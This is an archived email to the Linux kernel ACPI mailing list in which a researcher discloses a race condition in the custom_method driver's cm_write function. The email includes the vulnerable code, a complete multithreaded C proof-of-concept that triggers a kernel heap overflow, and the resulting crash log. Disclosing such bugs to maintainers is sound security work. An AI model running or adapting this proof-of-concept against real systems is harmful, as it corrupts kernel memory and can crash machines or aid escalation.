Return-Path: <linux-acpi-owner@vger.kernel.org>
X-Original-To: lists+linux-acpi@lfdr.de
Delivered-To: lists+linux-acpi@lfdr.de
Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
	by mail.lfdr.de (Postfix) with ESMTP id AB4F5BB2EB
	for <lists+linux-acpi@lfdr.de>; Mon, 23 Sep 2019 13:40:05 +0200 (CEST)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S1732224AbfIWLkB (ORCPT <rfc822;lists+linux-acpi@lfdr.de>);
        Mon, 23 Sep 2019 07:40:01 -0400
Received: from mail-wm1-f66.google.com ([209.85.128.66]:39260 "EHLO
        mail-wm1-f66.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S1726146AbfIWLkB (ORCPT
        <rfc822;linux-acpi@vger.kernel.org>); Mon, 23 Sep 2019 07:40:01 -0400
Received: by mail-wm1-f66.google.com with SMTP id v17so8918461wml.4
        for <linux-acpi@vger.kernel.org>; Mon, 23 Sep 2019 04:39:59 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to
         :content-transfer-encoding;
        bh=Rw6Jf2NhqWwl/DE2fSyvS6BiyFBfHnNcTuUDREeC1fY=;
        b=RFeUJ8egMw04OvgKPQ5PSV8RliU5JHK8r9YRhKUaqY9u9s9qYq3cKG2Aes5xaUjxy7
         VuqFZEPfj9q4Vrl+Zurq/9YJi3iDNYH/g4503zEtVKQAs+K5iL0E0GoFjVa8ek50LVEj
         c3aNcY3fWecMOUntvxQmO+72KJKAgX4RfqTYD+0jRPATbOaRknGC4I5ZNORNTkUx4cYO
         ltle6ar0xCnvKugJYgXJ9K44fzrMjx467NLHOUxX7yG1/XRT+n6h5pfKBrKrama/uozA
         +RZCyypysjx6KpVQTnNaiWVglc01jD4eziiXL04aIOwOLhBRpnr9X86GrVKh28SsKWlf
         LTfg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to
         :content-transfer-encoding;
        bh=Rw6Jf2NhqWwl/DE2fSyvS6BiyFBfHnNcTuUDREeC1fY=;
        b=fY/a5TobHB/MkCaQhcwsWvrcDsPniwVztxuBxs7wXfYV6lRdm/TD4n46zkOxMcavZA
         yg3iwmCTIDdmPNLhwjxeMIsnqBD1VGI8QzEBnMNIrH4MYItJs26YgWusfGhp7iti5JW6
         IbYxWUjC15xvPs9FVBMSanUTE868cgV7OZwlxZuMGaBns3ve4WFJ2rjky+wY70uA1E2B
         HngbZJ8Rr4ofDi/cktAYwzDiNBKi2OnqJGGD7JGSJl07lccX8vf8EnBxiABnDDBKVTc/
         qXSVnk5jxZnCdEjDoil+IWwoPpvpN9xejoPmqpWqJ/6IBcqpRS9fcMnegDaEtj8uAk4S
         zy+w==
X-Gm-Message-State: APjAAAVKFcdCPd7rXwZGByXXJ9TTxuXEmWE7z58LiEyFa2/YB1pk80MT
        VXwmE3P8b1OEJkNjg4yizglKgaq7gNfbbS6Za8VVhodC
X-Google-Smtp-Source: APXvYqyvedJEjEzbzpIT6VAdlciourVj2t7zEyKcmUqOcmEqGwLAj5tDQLaLoP1+iK/DydJGTxmitB4lqEyLPfCaMv0=
X-Received: by 2002:a1c:1903:: with SMTP id 3mr12719015wmz.4.1569238798315;
 Mon, 23 Sep 2019 04:39:58 -0700 (PDT)
MIME-Version: 1.0
From:   y0ubat <y00ubat@gmail.com>
Date:   Mon, 23 Sep 2019 20:39:22 +0900
Message-ID: <CAKz3r=PkczhdDXOySw2TWnbt5zc9t_BLQgjOo0YvDrcHO3ARPA@mail.gmail.com>
Subject: Linux acpi custom_method driver security bug report!
To:     linux-acpi@vger.kernel.org
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
Sender: linux-acpi-owner@vger.kernel.org
Precedence: bulk
List-ID: <linux-acpi.vger.kernel.org>
X-Mailing-List: linux-acpi@vger.kernel.org

Hi,

I found linux kernel bug. so report this!
I want to get credit(CVE)
I look forward to your reply.


Linux custom_mehtod driver race condition to heap overflow



https://android.googlesource.com/kernel/common/+/refs/heads/android-4.14-p/=
drivers/acpi/custom_method.c



https://github.com/torvalds/linux/blob/master/drivers/acpi/custom_method.c





The cm_write function in custom_method.c has a race condition vulnerability=
.



static ssize_t cm_write(struct file *file, const char __user * user_buf,

                                        size_t count, loff_t *ppos)

{

static char *buf;

static u32 max_size;

static u32 uncopied_bytes;

=E2=80=A6.

=E2=80=A6.

}



This static local variable is used, but no mutex lock is used. So race
condition occurs.

A race condition can cause a heap overflow.











/* /sys/kernel/debug/acpi/custom_method */



static ssize_t cm_write(struct file *file, const char __user * user_buf,

                                        size_t count, loff_t *ppos)

{

             static char *buf;

             static u32 max_size;

             static u32 uncopied_bytes;



             struct acpi_table_header table;

             acpi_status status;



             if (!(*ppos)) {

                           /* parse the table header to get the table lengt=
h */

                           if (count <=3D sizeof(struct acpi_table_header))

                                        return -EINVAL;

                           if (copy_from_user(&table, user_buf,

                                                        sizeof(struct
acpi_table_header)))

                                        return -EFAULT;

                           uncopied_bytes =3D max_size =3D table.length;
// controll max_size.

                           buf =3D kzalloc(max_size, GFP_KERNEL);

                           if (!buf)

                                        return -ENOMEM;

             }



             if (buf =3D=3D NULL)

                           return -EINVAL;



             if ((*ppos > max_size) ||

                 (*ppos + count > max_size) ||

                 (*ppos + count < count) ||

                 (count > uncopied_bytes))

                           return -EINVAL;



             if (copy_from_user(buf + (*ppos), user_buf, count)) {  //
heap overflow

                           kfree(buf);

                           buf =3D NULL;

                           return -EFAULT;

             }



             uncopied_bytes -=3D count;

             *ppos +=3D count;



             if (!uncopied_bytes) {

                           status =3D acpi_install_method(buf);

                           kfree(buf);

                           buf =3D NULL;

                           if (ACPI_FAILURE(status))

                                        return -EINVAL;

                           add_taint(TAINT_OVERRIDDEN_ACPI_TABLE,
LOCKDEP_NOW_UNRELIABLE);

             }

             return count;

}.



if (copy_from_user(&table, user_buf,

                                                        sizeof(struct
acpi_table_header)))

                                        return -EFAULT;

                           uncopied_bytes =3D max_size =3D table.length;
// controll max_size.

                           buf =3D kzalloc(max_size, GFP_KERNEL);



=E2=80=A6

=E2=80=A6

=E2=80=A6

             if (copy_from_user(buf + (*ppos), user_buf, count)) {  //
heap overflow



First, in thread 1, max_size is set to 0x1000 and kzalloc is allocated
to 0x1000. and Copy user input to copy_from_user in the allocated heap
space. Just before copying from copy_from_user, we assign 0x100 to
kzalloc for buf on thread 2. Then, thread 1 copies 0x1000 to the
reallocated 0x100 heap space, causing a heap overflow.

























This is My POC Code.



#include <stdio.h>

#include <stdlib.h>

#include <string.h>

#include <unistd.h>

#include <fcntl.h>

#include <pthread.h>

#include <sys/types.h>

#include <sys/ioctl.h>



typedef unsigned int u32;

typedef unsigned char u8;



int fd, fd2;



#define ACPI_NAME_SIZE                  4

#define ACPI_OEM_ID_SIZE                6

#define ACPI_OEM_TABLE_ID_SIZE          8



struct acpi_table_header {

             char signature[ACPI_NAME_SIZE];           /* ASCII table
signature */

             u32 length;                 /* Length of table in bytes,
including this header */

             u8 revision;                /* ACPI Specification minor
version number */

             u8 checksum;                         /* To make sum of
entire table =3D=3D 0 */

             char oem_id[ACPI_OEM_ID_SIZE];           /* ASCII OEM
identification */

             char oem_table_id[ACPI_OEM_TABLE_ID_SIZE];         /*
ASCII OEM table identification */

             u32 oem_revision;  /* OEM revision number */

             char asl_compiler_id[ACPI_NAME_SIZE];           /* ASCII
ASL compiler vendor ID */

             u32 asl_compiler_revision;            /* ASL compiler version =
*/

             char buf[0x10000];

} ;



void *thread1(void *arg) {

             struct acpi_table_header abc;

             memset(&abc, 0, sizeof(abc));

             while(1) {

                           abc.length =3D 0x100;

                           write(fd, &abc, 0x10000);

             }

}



void *thread2(void *arg) {

             struct acpi_table_header abc;

             memset(&abc, 0, sizeof(abc));

             while(1) {

                           abc.length =3D 0x10000;

                           write(fd2, &abc, 0x10000);

             }

}





int main(int argc, char *argv[])

{



             fd =3D open("/sys/kernel/debug/acpi/custom_method", O_WRONLY);

             fd2 =3D open("/sys/kernel/debug/acpi/custom_method", O_WRONLY)=
;

             pthread_t tid;



             pthread_create(&tid, NULL, thread1, NULL);

             pthread_create(&tid, NULL, thread2, NULL);



             getchar();



             return 0;

}


[  817.068780][ T5809] usercopy: Kernel memory overwrite attempt
detected to SLAB object 'kmalloc-256' (offset 0, size 65536)!
[  817.069671][ T5809] ------------[ cut here ]------------
[  817.069998][ T5809] kernel BUG at mm/usercopy.c:98!
[  817.070304][ T5809] invalid opcode: 0000 [#1] PREEMPT SMP KASAN
[  817.070665][ T5809] CPU: 3 PID: 5809 Comm: custom_method_p Not
tainted 5.3.0-rc8+ #4
[  817.071151][ T5809] Hardware name: QEMU Standard PC (i440FX + PIIX,
1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[  817.071772][ T5809] RIP: 0010:usercopy_abort+0xae/0xd0
[  817.072083][ T5809] Code: 38 08 c4 ff 48 8b 45 c0 4d 89 e9 48 89 d9
4c 8b 45 c8 41 57 4c 89 e6 48 c7 c7 e0 3b 35 87 48 8b 55 d0 41 56 50
e8 16 56 af ff <0f> 0b 49 c7 c5 80 39 35 87 4c 89 e8 4d 89 e8 e9 76 ff
ff ff 0f 1f
[  817.073260][ T5809] RSP: 0018:ffff888118fa7bf0 EFLAGS: 00010286
[  817.073653][ T5809] RAX: 0000000000000067 RBX: ffffffff8815ee9f
RCX: ffffffff815726b8
[  817.074152][ T5809] RDX: 0000000000000000 RSI: 0000000000000008
RDI: ffffffff89fca180
[  817.074638][ T5809] RBP: ffff888118fa7c48 R08: ffffed102351e0d1
R09: ffffed102351e0d1
[  817.075144][ T5809] R10: 0000000000000180 R11: ffffed102351e0d0
R12: ffffffff87353a40
[  817.075611][ T5809] R13: ffffffff8815c4b5 R14: 0000000000000000
R15: 0000000000010000
[  817.076078][ T5809] FS:  00007f5ae2831700(0000)
GS:ffff88811a8c0000(0000) knlGS:0000000000000000
[  817.076605][ T5809] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  817.076991][ T5809] CR2: 00007f5ae282f000 CR3: 0000000100bf6000
CR4: 00000000000006e0
[  817.077502][ T5809] DR0: 0000000000000000 DR1: 0000000000000000
DR2: 0000000000000000
[  817.077968][ T5809] DR3: 0000000000000000 DR6: 00000000fffe0ff0
DR7: 0000000000000400

kernel panic log!
